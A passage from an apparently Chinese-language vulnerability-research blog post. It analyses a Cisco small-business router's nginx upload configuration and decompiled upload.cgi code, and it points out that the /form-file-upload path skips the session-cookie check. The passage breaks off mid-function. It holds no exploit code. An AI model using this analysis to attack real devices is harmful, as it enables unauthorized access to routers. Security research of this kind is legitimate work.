= &quot;<span class="number">1</span>&quot;) &#123;</span><br><span class="line">return <span class="number">403</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">upload_pass /<span class="selector-tag">form</span>-file-upload;</span><br><span class="line">upload_store /tmp/upload;</span><br><span class="line">upload_store_access user:rw group:rw all:rw;</span><br><span class="line">upload_set_form_field $upload_field_name<span class="selector-class">.name</span> &quot;$upload_file_name&quot;;</span><br><span class="line">upload_set_form_field $upload_field_name<span class="selector-class">.content_type</span> &quot;$upload_content_type&quot;;</span><br><span class="line">upload_set_form_field $upload_field_name<span class="selector-class">.path</span> &quot;$upload_tmp_path&quot;;</span><br><span class="line">upload_aggregate_form_field &quot;$upload_field_name<span class="selector-class">.md5</span>&quot; &quot;$upload_file_md5&quot;;</span><br><span class="line">upload_aggregate_form_field &quot;$upload_field_name<span class="selector-class">.size</span>&quot; &quot;$upload_file_size&quot;;</span><br><span class="line">upload_pass_form_field &quot;^.*$&quot;;</span><br><span class="line">upload_cleanup <span class="number">400</span> <span class="number">404</span> <span class="number">499</span> <span class="number">500</span>-<span class="number">505</span>;</span><br><span class="line">upload_resumable on;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>location块的主要作用是 基于Nginx服务器接收到的字符串（例如&#x2F;api&#x2F;operations&#x2F;ciscosb-file:form-file-upload），对除虚拟主机名称之外的字符串进行匹配，对特定的请求进行处理。地址定向、数据缓存和应答控制等功能都是在这部分实现</p><p>在Nginx的官方文档中定义的location的语法结构为：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location <span class="selector-attr">[ = | ~ | ~* | ^~ ]</span> uri &#123; ... &#125;</span><br></pre></td></tr></table></figure><p>其中uri就是我们的&#x2F;api….那一串，它也可以含正则表达</p></blockquote><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if ($http_authorization != &quot;&quot;) &#123;</span><br><span class="line">    set $deny &quot;<span class="number">0</span>&quot;;</span><br><span class="line">&#125;</span><br><span class="line">if ($deny = &quot;<span class="number">1</span>&quot;) &#123;</span><br><span class="line">    return <span class="number">403</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>匹配完成之后会对http_authorization进行判断，全局搜索这个变量发现在&#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;proxy.conf中对其进行了定义</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331142.png" alt="image-20240811133551968"></p><p>因此就是对Authorization这个环境变量进行判定，猜测是身份证明，如果没有的话就会403报错</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">upload_pass /form-file-upload;</span><br><span class="line">upload_store /tmp/upload;</span><br><span class="line">upload_store_access user:rw group:rw all:rw;</span><br><span class="line">upload_set_form_field $upload_field_name.name <span class="string">&quot;$upload_file_name&quot;</span>;</span><br><span class="line">upload_set_form_field $upload_field_name.content_type <span class="string">&quot;$upload_content_type&quot;</span>;</span><br><span class="line">upload_set_form_field $upload_field_name.path <span class="string">&quot;$upload_tmp_path&quot;</span>;</span><br><span class="line">upload_aggregate_form_field <span class="string">&quot;$upload_field_name.md5&quot;</span> <span class="string">&quot;$upload_file_md5&quot;</span>;</span><br><span class="line">upload_aggregate_form_field <span class="string">&quot;$upload_field_name.size&quot;</span> <span class="string">&quot;$upload_file_size&quot;</span>;</span><br><span class="line">upload_pass_form_field <span class="string">&quot;^.*$&quot;</span>;</span><br><span class="line">upload_cleanup <span class="number">400</span> <span class="number">404</span> <span class="number">499</span> <span class="number">500</span><span class="number">-505</span>;</span><br><span class="line">upload_resumable on;</span><br></pre></td></tr></table></figure><p>之后便是对nginx upload module配置参数了</p><p><strong>upload_pass &#x2F;form-file-upload：</strong>指明了后续要处理的php文件，转到后端处理&#x2F;form-file-upload这个参数</p><p><strong>upload_store &#x2F;tmp&#x2F;upload：</strong>指定了上传文件的存放地址</p><p><strong>upload_store_access user:rw group:rw all:rw：</strong>上传文件的访问权限，所有人都是rw</p><p><strong>upload_set_form_field $upload_field_name.name “$upload_file_name”：</strong>设置参数</p><p><strong>upload_pass_form_field “^.*$”：</strong>从表单原样转到后端参数，是一个正则匹配^表示开始，.表示任意字符，*表示可以出现零次或多次，$是结束，因此说明可以上传任意字符到后端</p><p><strong>upload_cleanup 400 404 499 500-505：</strong>如果出现了400 404等这些错误就删除所有上传的文件</p><p>在这里没有对cookie_sessionid进行判断</p><blockquote><p><code>cookie_sessionid</code></p><ul><li><strong>用途</strong>: 存储用户的会话标识符。</li><li><strong>作用</strong>: 服务器使用这个标识符来识别用户的会话状态，保持用户登录状态，或跟踪用户活动。</li></ul><p><code>Authorization</code></p><ul><li><strong>用途</strong>: 包含认证凭据。</li><li><strong>作用</strong>: 用于向服务器提供用户的身份信息，通常在 HTTP 请求头中使用。</li></ul></blockquote><p>我对其的理解就是没登陆，就能上传文件，这或许也是一种未授权的判定方法？</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331143.png" alt="image-20240811140200582"></p><p>可以看到正规的&#x2F;upload是存在对cookie_sessionid的判定的，($cookie_sessionid ~* “^[a-f0-9]{64}”)正则匹配要确保它是一个有效的 64 位十六进制字符串</p><p>之后看&#x2F;form-file-upload到底是什么</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331144.png" alt="image-20240811140509385"></p><blockquote><p>include指令：用于包含其他的配置文件</p></blockquote><p>其中包含了uwsgi_params这个配置文件，在&#x2F;etc&#x2F;nginx&#x2F;uwsgi_params，是一种用于<em>配置</em>与Nginx 之间的通信的文件。它定义了一些变量和选项，以确保正确地传递请求和响应。算是一种通用配置</p><p>uwsgi_pass指向uwsgi服务器IP和端口，设置读取和发送超时时间为3600秒</p><p>说明了它把请求发送给了uwsgi的服务器来处理</p><p>那么处理的文件是什么，我们先看nginx的启动程序</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331145.png" alt="image-20240811142007666"></p><p>在最后启动了uwsgi程序</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331146.png" alt="image-20240811142047541"></p><p>可以看到uwsgi的启动程序指定为&#x2F;usr&#x2F;bin&#x2F;uwsgi-launcher程序</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331147.png" alt="image-20240811142219102"></p><p>它执行了三个初始化程序，分别看一下</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[uwsgi]</span><br><span class="line"><span class="attribute">plugins</span> = cgi</span><br><span class="line">workers = <span class="number">4</span></span><br><span class="line">master = <span class="number">1</span></span><br><span class="line">uid = www-data</span><br><span class="line">gid = www-data</span><br><span class="line">socket=<span class="number">127.0.0.1:9000</span></span><br><span class="line">buffer-size=<span class="number">4096</span></span><br><span class="line">cgi = /jsonrpc=/www/cgi-bin/jsonrpc.cgi</span><br><span class="line">cgi-allowed-ext = .cgi</span><br><span class="line">cgi-allowed-ext = .pl</span><br><span class="line">cgi-timeout = <span class="number">3600</span></span><br><span class="line">ignore-sigpipe = <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>首先是启用了CGi插件来处理CGI脚本，配置了四个工作进程来处理请求，启用了主进程管理工作进程，设置身份，监听9000端口，设置缓冲区大小为4096，将 <code>/jsonrpc</code> 路径映射到 <code>/www/cgi-bin/jsonrpc.cgi</code> 脚本，允许运行的为.cgi .pl的扩展名，忽略了signal信号。总之就是监听9000端口，运行cgi脚本。接下来的两个ini也是如此，就不过多赘述了，但是看到我们之前分析的&#x2F;upload的uswgi是发送到9003端口来处理请求的，因此看到</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331148.png" alt="image-20240811142811028"></p><p>发现是&#x2F;www&#x2F;cgi-bin&#x2F;upload-cgi来处理请求的，调用的方式是先 <code>fork</code> 了一个子进程，然后 <code>execvp</code> 来执行 <code>upload.cgi</code></p><h2 id="二进制文件分析"><a href="#二进制文件分析" class="headerlink" title="二进制文件分析"></a>二进制文件分析</h2><h3 id="StrBuf系列函数"><a href="#StrBuf系列函数" class="headerlink" title="StrBuf系列函数"></a>StrBuf系列函数</h3><p>在分析upload-cgi前要先看一些自定义函数的定义，不然会较难分析</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD *<span class="title">StrBufCreate</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v0; <span class="comment">// r4</span></span><br><span class="line">  _BYTE *v1; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">malloc</span>(<span class="number">0xC</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    v0[<span class="number">1</span>] = <span class="number">0x37</span>;</span><br><span class="line">    v1 = <span class="built_in">malloc</span>(<span class="number">0x37</span>u);</span><br><span class="line">    *v0 = v1;</span><br><span class="line">    <span class="keyword">if</span> ( !v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(v0);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *v1 = <span class="number">0</span>;</span><br><span class="line">    v0[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>StrBufCreate函数，没有参数，作用是创建一个三个地址长度的chunk，然后第二个长度写Buf的长度即0x37，低三个长度是0，第一个长度是Buf的地址，还算是比较清晰的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD *__fastcall <span class="title">StrBufAppendStr</span><span class="params">(_DWORD *a1, <span class="type">const</span> <span class="type">char</span> *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *result; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// r5</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a2 || !<span class="built_in">StrBufIsOK</span>(a1) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(a2);</span><br><span class="line">  result = <span class="built_in">sub_1BBC</span>((<span class="type">void</span> **)a1, v5 + a1[<span class="number">2</span>] + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span> *)(*a1 + a1[<span class="number">2</span>]), a2);</span><br><span class="line">    result = &amp;dword_0 + <span class="number">1</span>;</span><br><span class="line">    a1[<span class="number">2</span>] += v5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总体而言，这段代码实现了一个动态字符串缓冲区的管理，能够在原有字符串的基础上追加新的字符串，同时确保在追加时有足够的内存空间。如果内存不足，它会进行重新分配并处理相关的内存管理。</p><p>如果感兴趣可以自行分析</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">StrBufSetStr</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">StrBufClear</span>(a1);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">StrBufAppendStr</span>((_DWORD *)a1, (<span class="type">const</span> <span class="type">char</span> *)a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>便是清除a1，然后a2覆盖在a1里面，即可以理解为赋值</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD *__fastcall <span class="title">StrBufToStr</span><span class="params">(_DWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *result; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  result = <span class="built_in">StrBufIsOK</span>(a1);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    <span class="keyword">return</span> (_DWORD *)*a1;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断是否合法，如果合法则返回地址，不合法就返回错误信息</p><h3 id="jsonutil系列函数"><a href="#jsonutil系列函数" class="headerlink" title="jsonutil系列函数"></a>jsonutil系列函数</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">jsonutil_get_string</span><span class="params">(<span class="type">int</span> a1, _DWORD *a2, ...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  va_list varg_r2; <span class="comment">// [sp+10h] [bp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">va_start</span>(varg_r2, a2);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">jsonutil_vget</span>(a1, (<span class="type">int</span> *)varg_r2) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  *a2 = <span class="built_in">json_object_get_string</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整体来看，这段代码的目的是从一个 JSON 对象中提取字符串。<code>jsonutil_get_string</code> 函数负责调用 <code>jsonutil_vget</code> 进行处理，而 <code>jsonutil_vget</code> 则通过不断检查和获取 JSON 对象的值，最终返回一个有效的索引或对象。若成功获取字符串，则将其存储在传入的指针 <code>*a2</code> 中。</p><h3 id="multi系列函数"><a href="#multi系列函数" class="headerlink" title="multi系列函数"></a>multi系列函数</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span> *__fastcall <span class="title">multipart_parser_init</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, <span class="type">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">size_t</span> v6; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  v5 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">2</span> * v4 + <span class="number">37</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(v5 + <span class="number">24</span>, a1);</span><br><span class="line">  v6 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  *((_DWORD *)v5 + <span class="number">2</span>) = v6;</span><br><span class="line">  *((_DWORD *)v5 + <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)v5 + <span class="number">5</span>) = &amp;v5[v6 + <span class="number">25</span>];</span><br><span class="line">  result = v5;</span><br><span class="line">  v5[<span class="number">12</span>] = <span class="number">2</span>;</span><br><span class="line">  *((_DWORD *)v5 + <span class="number">4</span>) = a2;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码的功能是为一个多部分解析器分配内存并初始化其状态，包括存储输入字符串及其长度、设置一些状态字段等</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">multipart_parser_execute</span>(v12, v8, v13);该函数源码过长就不贴了</span><br></pre></td></tr></table></figure><p>主要的作用可能是用于解析HTTP请求中的<code>multipart/form-data</code>，但是由于可控段不在这里就不过多的分析了，详细请看下文</p><p><strong>分析到这里，我认为这些函数，想必是网上开源的函数，大概率是没有什么漏洞可言的，因此主要看函数的作用以及主函数的逻辑漏洞</strong></p><h3 id="cgi文件分析"><a href="#cgi文件分析" class="headerlink" title=".cgi文件分析"></a>.cgi文件分析</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *CONTENT_LENGTH_addr; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">char</span> *CONTENT_TYPE_addr; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">char</span> *REQUEST_URI_addr; <span class="comment">// r7</span></span><br><span class="line">  <span class="type">char</span> *HTTP_COOKIE_addr; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">void</span> *v7; <span class="comment">// r0</span></span><br><span class="line">  _BYTE *v8; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">char</span> *v9; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">void</span> *v10; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">size_t</span> v13; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> *v14; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v15; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">int</span> v23; <span class="comment">// r7</span></span><br><span class="line">  <span class="type">int</span> v24; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v25; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v26; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> *haystack; <span class="comment">// [sp+14h] [bp-464h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v29; <span class="comment">// [sp+18h] [bp-460h] BYREF</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v30; <span class="comment">// [sp+1Ch] [bp-45Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v31; <span class="comment">// [sp+20h] [bp-458h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v32; <span class="comment">// [sp+24h] [bp-454h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v33; <span class="comment">// [sp+28h] [bp-450h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v34; <span class="comment">// [sp+2Ch] [bp-44Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v35; <span class="comment">// [sp+30h] [bp-448h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v36; <span class="comment">// [sp+34h] [bp-444h] BYREF</span></span><br><span class="line">  <span class="type">int</span> boundary; <span class="comment">// [sp+38h] [bp-440h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v38; <span class="comment">// [sp+3Ch] [bp-43Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v39; <span class="comment">// [sp+40h] [bp-438h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v40[<span class="number">7</span>]; <span class="comment">// [sp+44h] [bp-434h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">1048</span>]; <span class="comment">// [sp+60h] [bp-418h] BYREF</span></span><br><span class="line"></span><br><span class="line">  CONTENT_LENGTH_addr = <span class="built_in">getenv</span>(<span class="string">&quot;CONTENT_LENGTH&quot;</span>);</span><br><span class="line">  CONTENT_TYPE_addr = <span class="built_in">getenv</span>(<span class="string">&quot;CONTENT_TYPE&quot;</span>);</span><br><span class="line">  REQUEST_URI_addr = <span class="built_in">getenv</span>(<span class="string">&quot;REQUEST_URI&quot;</span>);</span><br><span class="line">  HTTP_COOKIE_addr = <span class="built_in">getenv</span>(<span class="string">&quot;HTTP_COOKIE&quot;</span>);</span><br><span class="line">  v7 = <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x400</span>u);</span><br><span class="line">  haystack = <span class="number">0</span>;</span><br><span class="line">  v29 = <span class="number">0</span>;</span><br><span class="line">  v30 = <span class="number">0</span>;</span><br><span class="line">  v31 = <span class="number">0</span>;</span><br><span class="line">  v32 = <span class="number">0</span>;</span><br><span class="line">  v33 = <span class="number">0</span>;</span><br><span class="line">  v34 = <span class="number">0</span>;</span><br><span class="line">  v35 = <span class="number">0</span>;</span><br><span class="line">  v36 = <span class="number">0</span>;</span><br><span class="line">  boundary = <span class="built_in">StrBufCreate</span>((<span class="type">int</span>)v7);</span><br><span class="line">  v38 = <span class="built_in">StrBufCreate</span>(boundary);</span><br><span class="line">  v39 = <span class="built_in">StrBufCreate</span>(v38);</span><br><span class="line">  <span class="keyword">if</span> ( CONTENT_LENGTH_addr )</span><br><span class="line">    CONTENT_LENGTH_addr = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">atoi</span>(CONTENT_LENGTH_addr);</span><br><span class="line">  v8 = <span class="built_in">malloc</span>((<span class="type">size_t</span>)(CONTENT_LENGTH_addr + <span class="number">1</span>));</span><br><span class="line">  v8[<span class="built_in">fread</span>(v8, <span class="number">1u</span>, (<span class="type">size_t</span>)CONTENT_LENGTH_addr, (FILE *)_bss_start)] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( CONTENT_TYPE_addr &amp;&amp; <span class="built_in">strstr</span>(CONTENT_TYPE_addr, <span class="string">&quot;boundary=&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">StrBufSetStr</span>(boundary, <span class="string">&quot;--&quot;</span>);</span><br><span class="line">    v9 = <span class="built_in">strstr</span>(CONTENT_TYPE_addr, <span class="string">&quot;boundary&quot;</span>);</span><br><span class="line">    <span class="built_in">StrBufAppendStr</span>(boundary, v9 + <span class="number">9</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v10 = <span class="built_in">memset</span>(v40, <span class="number">0</span>, <span class="built_in">sizeof</span>(v40));</span><br><span class="line">  v40[<span class="number">1</span>] = (<span class="type">int</span>)sub_1138C;</span><br><span class="line">  v40[<span class="number">2</span>] = (<span class="type">int</span>)sub_11464;</span><br><span class="line">  dword_2348C = <span class="built_in">json_object_new_object</span>(v10);</span><br><span class="line">  v11 = <span class="built_in">StrBufToStr</span>(boundary);</span><br><span class="line">  v12 = <span class="built_in">multipart_parser_init</span>(v11, v40);</span><br><span class="line">  v13 = <span class="built_in">strlen</span>(v8);</span><br><span class="line">  <span class="built_in">multipart_parser_execute</span>(v12, v8, v13);</span><br><span class="line">  <span class="built_in">multipart_parser_free</span>(v12);</span><br><span class="line">  <span class="built_in">jsonutil_get_string</span>(dword_2348C, &amp;v29, <span class="string">&quot;\&quot;file.path\&quot;&quot;</span>, <span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">jsonutil_get_string</span>(dword_2348C, 